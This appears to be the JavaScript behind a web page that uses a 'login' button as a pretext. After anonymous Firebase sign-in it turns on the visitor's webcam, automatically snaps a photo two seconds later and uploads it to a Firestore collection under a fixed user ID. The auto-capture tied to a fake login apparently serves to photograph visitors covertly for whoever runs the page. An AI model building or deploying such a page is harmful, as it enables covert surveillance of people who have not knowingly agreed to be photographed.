import { auth, db } from "./firebase.js";
import { signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

const videoEl = document.getElementById("camera-stream");
const loginBtn = document.getElementById("login-button");
const captureBtn = document.getElementById("capture-button");

loginBtn.addEventListener("click", async () => {
  try {
    await signInAnonymously(auth);
    console.log("✅ Logged in anonymously");
    startCamera();
  } catch (err) {
    console.error("❌ Login failed:", err);
  }
});

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    videoEl.srcObject = stream;
    videoEl.play();

    // Auto-capture after 2 seconds
    setTimeout(() => {
      captureAndSave();
    }, 2000);
  } catch (err) {
    console.error("❌ Camera access failed:", err);
  }
}

captureBtn.addEventListener("click", captureAndSave);

async function captureAndSave() {
  const canvas = document.createElement("canvas");
  canvas.width = videoEl.videoWidth;
  canvas.height = videoEl.videoHeight;
  canvas.getContext("2d").drawImage(videoEl, 0, 0);
  const base64Image = canvas.toDataURL("image/jpeg", 0.8);

  try {
    const photosRef = collection(db, "artifacts", "gcam-app", "users", "8521574912", "captured_photos");
    await addDoc(photosRef, {
      base64Image,
      timestamp: serverTimestamp(),
      capturedAt: new Date().toLocaleString("hi-IN")
    });
    console.log("✅ Photo saved to Firestore");
  } catch (err) {
    console.error("❌ Save failed:", err);
  }
}
